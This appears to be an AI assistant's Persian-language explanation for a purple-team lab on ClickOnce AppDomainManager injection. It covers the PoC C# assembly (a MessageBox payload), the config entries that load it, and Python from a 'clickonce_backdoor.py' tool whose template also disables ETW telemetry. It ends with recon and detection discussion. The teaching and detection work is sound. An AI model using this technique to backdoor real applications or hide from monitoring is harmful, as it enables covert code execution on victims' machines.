
### 1. اصلاً `clickoneHelper.dll` چیست؟

این فایل یک **.NET Managed Assembly** است؛ یعنی یک DLL معمولی Win32 نیست که مثلاً با `LoadLibrary()` دستی Inject شود.

Blobber از این Source:

```csharp
public sealed class clickoneManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        Loader.Execute();
        return;
    }
}

public class Loader
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MessageBox(
        IntPtr hWnd,
        string text,
        string caption,
        uint type);

    public static bool Execute()
    {
        MessageBox(
            IntPtr.Zero,
            "AppDomainManager Injection - PoC",
            "ClickOnce Backdoor",
            0);

        return true;
    }
}
```

یک Assembly می‌سازد:

```text
clickoneHelper.dll
```

---

## 2. داخل DLL چه چیزهایی داریم؟

به‌صورت ساده:

```text
clickoneHelper.dll
│
├── clickoneManager
│      │
│      └── InitializeNewDomain()
│
└── Loader
       │
       └── Execute()
              │
              └── MessageBox()
```

یعنی DLL خودش دو Class اصلی دارد:

### `clickoneManager`

این Class از:

```csharp
AppDomainManager
```

ارث‌بری می‌کند.

پس:

```text
clickoneManager
       ↓
AppDomainManager
       ↓
.NET Framework
```

و متد مهمش:

```csharp
InitializeNewDomain()
```

است.

در PoC وقتی این callback اجرا شود:

```csharp
Loader.Execute();
```

فراخوانی می‌شود.

---

## 3. `Loader` چه کار می‌کند؟

`Loader` فقط کلاسی است که منطق PoC داخل آن قرار گرفته:

```csharp
public class Loader
{
    ...
}
```

و:

```csharp
public static bool Execute()
```

متد اجرایی آن است.

در Lab فعلی:

```csharp
MessageBox(...)
```

را اجرا می‌کند.

بنابراین:

```text
clickoneManager
       ↓
InitializeNewDomain()
       ↓
Loader.Execute()
       ↓
MessageBox
```

---

## 4. پس چرا اصلاً DLL لازم داریم؟

چون `clickone.exe.config` به CLR می‌گوید **AppDomainManager مورد استفاده از کدام Assembly و کدام Type باشد**.

در PoC شما چیزی شبیه این اضافه شده:

```xml
<runtime>
    <appDomainManagerAssembly
        value="clickoneHelper.dll, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />

    <appDomainManagerType
        value="clickoneManager" />
</runtime>
```

اینجا دو چیز مشخص شده:

```text
Assembly → clickoneHelper.dll
Type     → clickoneManager
```

پس CLR می‌داند:

> برای AppDomainManager از Assembly به نام `clickoneHelper.dll` و Type به نام `clickoneManager` استفاده کن.

---

## 5. رابطه‌ی سه فایل اصلی

این قسمت را برای Lab خیلی خوب حفظ کن:

```text
clickone.exe
    │
    │ reads
    ▼
clickone.exe.config
    │
    │ says:
    │
    │ Assembly = clickoneHelper.dll
    │ Type     = clickoneManager
    ▼
clickoneHelper.dll
    │
    ├── clickoneManager
    │       │
    │       └── InitializeNewDomain()
    │                  │
    │                  ▼
    │             Loader.Execute()
    │                  │
    │                  ▼
    │              MessageBox
    │
    └── Loader
```

بنابراین `clickoneHelper.dll` **خودش نقطه‌ی ورود اصلی نیست**؛ بلکه Assemblyای است که `AppDomainManager` سفارشی و منطق PoC داخل آن قرار گرفته‌اند.

---

## 6. چرا اسمش `Helper.dll` است؟

اسم:

```text
clickoneHelper.dll
```

هیچ معنی خاصی برای CLR ندارد.

می‌توانست مثلاً باشد:

```text
MyAssembly.dll
Test.dll
LabComponent.dll
```

چیزی که برای CLR مهم است این است که Configuration به Assembly و Type درست اشاره کند:

```text
Assembly → X.dll
Type     → Y
```

اسم `clickoneHelper.dll` را Blobber برای ساختار PoC انتخاب کرده.

---

### و یک نکته خیلی مهم برای درک تکنیک

این DLL را با این مفهوم اشتباه نکن:

```text
CreateRemoteThread
WriteProcessMemory
VirtualAllocEx
LoadLibrary
       ↓
Classic DLL Injection
```

در PoC تو چنین چیزی نداریم.

اینجا:

```text
ClickOnce
   ↓
clickone.exe
   ↓
CLR
   ↓
AppDomainManager configuration
   ↓
clickoneHelper.dll
   ↓
clickoneManager
   ↓
InitializeNewDomain()
```

بنابراین **`clickoneHelper.dll` یک Managed Assembly است که از طریق مکانیزم .NET و Configuration در Startup وارد جریان اجرای Application می‌شود، نه DLLای که با Process Injection داخل Process دیگری تزریق شده باشد.**


بله؛ در پروژه‌ای که داری، **خود `clickonce_backdoor.py`** این کار را انجام می‌دهد، نه `clickoneHelper.dll`.

مسیر دقیقش این است:

```text
clickonce_backdoor.py
        │
        ├── 1. MessageBoxPoC.cs را می‌خواند
        │
        ├── 2. آن را Compile می‌کند
        │       ↓
        │   clickoneHelper.dll
        │
        └── 3. clickone.exe.config را Modify می‌کند
                ↓
          appDomainManagerAssembly
          appDomainManagerType
```

### بخش مهم کد

همان کدی که قبلاً از `clickonce_backdoor.py` نشان دادی:

```python
cfgname = f'{self.exe_name}.config'
cfgpath = self.app_dir / cfgname

existing = parse_existing_cfg(cfgpath) if cfgpath.exists() else ''

cfgpath.write_text(
    CFG_TPL.format(
        asm=self.dll_name,
        cls=self.class_name,
        existing=existing
    ),
    encoding='utf-8'
)
```

اینجا اتفاق اصلی می‌افتد.

`self.dll_name` در Lab تو:

```text
clickoneHelper.dll
```

و:

```text
self.class_name
```

برابر است با:

```text
clickoneManager
```

---

### Template که وارد Config می‌شود

بالای همان Python فایل، Template این است:

```xml
<runtime>
    <appDomainManagerAssembly
        value="{asm}, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />

    <appDomainManagerType
        value="{cls}" />

    <etwEnable enabled="false" />
</runtime>
```

بعد Python جای `{asm}` و `{cls}` را پر می‌کند.

در نتیجه Config نهایی تقریباً به این تبدیل می‌شود:

```xml
<runtime>
    <appDomainManagerAssembly
        value="clickoneHelper.dll, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />

    <appDomainManagerType
        value="clickoneManager" />

    <etwEnable enabled="false" />
</runtime>
```

### پس نقش هر فایل

```text
clickonce_backdoor.py
        │
        ├──────────────→ clickone.exe.config
        │                    │
        │                    └── می‌گوید Assembly چیست
        │                        و Type چیست
        │
        └──────────────→ clickoneHelper.dll
                             │
                             ├── clickoneManager
                             │
                             └── Loader
```

و بعد هنگام اجرای Application:

```text
clickone.exe
    ↓
clickone.exe.config
    ↓
"clickoneHelper.dll"
    ↓
"clickoneManager"
    ↓
InitializeNewDomain()
```

پس اگر بخواهی **در کد Python دقیقاً جایی که Config Modify می‌شود** را پیدا کنی، دنبال این قسمت بگرد:

```python
cfgpath.write_text(
    CFG_TPL.format(...)
)
```

این همان نقطه‌ای است که `clickone.exe.config` بازنویسی می‌شود.


### مهاجم از کجا میفهمه سازمان از این تکنولوژی استفاده میکنه 



برای ClickOnce هم معمولاً مهاجم از قبل نمی‌داند «این سازمان حتماً ClickOnce دارد». او از بیرون دنبال **نشانه‌های قابل مشاهده** می‌گردد.

### مدل ذهنی درست

فرض کن سازمان یک Application داخلی/سازمانی دارد:

```text
Internet
   │
   │  چیزی که مهاجم می‌تواند ببیند
   ▼
Public Web / DNS / Search / Email / Docs
   │
   └── نشانه‌ای از Application
           │
           ▼
       ClickOnce
           │
           ▼
     clickone.application
```

مهاجم ممکن است از منابع عمومی بفهمد که سازمان از یک Application خاص استفاده می‌کند؛ مثلاً:

- صفحات وب عمومی یا مستندات سازمان
    
- Software/Download portal
    
- URLهای Application
    
- DNS و Certificateهای عمومی
    
- اسناد منتشرشده یا راهنماهای کاربران
    
- اطلاعات موجود در صفحات Login/SSO
    
- ایمیل‌های واقعی سازمان یا نام Applicationهایی که کاربران استفاده می‌کنند
    

این‌ها **Reconnaissance** هستند، نه Internal Discovery.

---

### اما یک نکته خیلی مهم درباره ClickOnce

وجود `.application` الزاماً به این معنی نیست که مهاجم می‌تواند از اینترنت آن را پیدا کند.

ممکن است:

```text
Internet
   ↓
example.com
   ↓
Public Website
```

ولی ClickOnce application فقط داخل:

```text
Internal Network
   ↓
intranet.company.local
   ↓
ClickOnce Application
```

باشد.

در این حالت مهاجم از اینترنت ممکن است اصلاً نداند چنین Applicationای وجود دارد.

بنابراین این تصور:

> «مهاجم یک ClickOnce packet می‌فرستد و هر سازمانی که ClickOnce داشته باشد اجرا می‌شود»

**درست نیست.**

ClickOnce یک **Deployment technology** است، نه یک سرویس شبکه‌ای که مهاجم بتواند مثل یک Port Scanner آن را پیدا کند.

---

### Initial Access واقعی بیشتر شبیه این است

مهاجم ابتدا یک **delivery opportunity** پیدا می‌کند:

```text
Recon
  ↓
شناخت سازمان / کاربران / Applications
  ↓
پیدا کردن یک مسیر Delivery
  ↓
ارسال/ارائه Application
  ↓
User Interaction
  ↓
ClickOnce Activation
  ↓
Application Execution
```

در سناریوی آموزشی تو، ClickOnce بیشتر یک **Execution/Delivery mechanism** است که می‌تواند در زنجیره Initial Access قرار بگیرد؛ خودش به‌تنهایی «Initial Access» محسوب نمی‌شود.

---

### و این قسمت برای Threat Hunting تو خیلی مهم است

اگر بخواهی این تکنیک را از دید Defender بررسی کنی، سؤال اصلی نباید فقط این باشد:

> «آیا سازمان ClickOnce دارد؟»

بلکه باید زنجیره را ببینی:

```text
External Delivery
       ↓
ClickOnce
       ↓
dfsvc.exe
       ↓
Application Installation/Activation
       ↓
Unexpected application
       ↓
Unexpected .NET configuration
       ↓
AppDomainManager
       ↓
Assembly Load
```

در نتیجه اگر مهاجم **هیچ دید داخلی** نداشته باشد، الزاماً نمی‌تواند بداند چه ClickOnce Applicationهایی داخل شبکه وجود دارند. برای همین در یک سناریوی واقعی، **Recon بیرونی + Social/Email Delivery + User Interaction** می‌تواند نقش مهمی داشته باشد.

و اتفاقاً همین موضوع باعث می‌شود Lab تو برای Purple Team جالب باشد: می‌توانی از خودت بپرسی **«اگر مهاجم هیچ Internal Discovery نداشته باشد، چه Telemetryای از اولین Delivery تا `dfsvc.exe` و اجرای Application باقی می‌ماند؟»** این سؤال از نظر Detection Engineering خیلی ارزشمندتر از صرفاً اجرای MessageBox است.